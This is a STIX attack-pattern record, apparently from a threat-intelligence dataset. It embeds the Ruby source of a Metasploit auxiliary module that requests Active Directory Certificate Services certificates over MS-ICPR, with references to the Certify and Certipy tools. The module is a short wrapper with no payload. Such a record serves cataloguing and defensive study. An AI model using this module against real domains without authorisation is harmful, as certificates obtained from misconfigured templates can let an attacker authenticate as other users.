{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c61cb5a0-1d5d-4cd9-afa1-0353eeac1f8c",
    "created": "2024-08-14T16:22:27.803615Z",
    "modified": "2024-08-14T16:22:27.803619Z",
    "name": "ICPR Certificate Management",
    "description": " Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate template's configuration the resulting certificate can be used for various operations such as authentication. PFX certificate files that are saved are encrypted with a blank password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/dcerpc/icpr_cert.rb",
            "external_id": "icpr_cert.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/GhostPack/Certify"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ly4k/Certipy"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'ruby_smb/dcerpc/client'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MsIcpr\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ICPR Certificate Management',\n        'Description' => %q{\n          Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate\n          template's configuration the resulting certificate can be used for various operations such as authentication.\n          PFX certificate files that are saved are encrypted with a blank password.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Will Schroeder', # original idea/research\n          'Lee Christensen', # original idea/research\n          'Oliver Lyak', # certipy implementation\n          'Spencer McIntyre'\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/GhostPack/Certify' ],\n          [ 'URL', 'https://github.com/ly4k/Certipy' ]\n        ],\n        'Notes' => {\n          'Reliability' => [],\n          'Stability' => [],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'AKA' => [ 'Certifry', 'Certipy' ]\n        },\n        'Actions' => [\n          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]\n        ],\n        'DefaultAction' => 'REQUEST_CERT'\n      )\n    )\n  end\n\n  def run\n    send(\"action_#{action.name.downcase}\")\n  rescue MsIcprConnectionError => e\n    fail_with(Failure::Unreachable, e.message)\n  rescue MsIcprAuthenticationError => e\n    fail_with(Failure::NoAccess, e.message)\n  rescue MsIcprNotFoundError => e\n    fail_with(Failure::NotFound, e.message)\n  rescue MsIcprUnexpectedReplyError => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  rescue MsIcprUnknownError => e\n    fail_with(Failure::Unknown, e.message)\n  end\n\n  def action_request_cert\n    request_certificate\n  end\n\nend\n"
}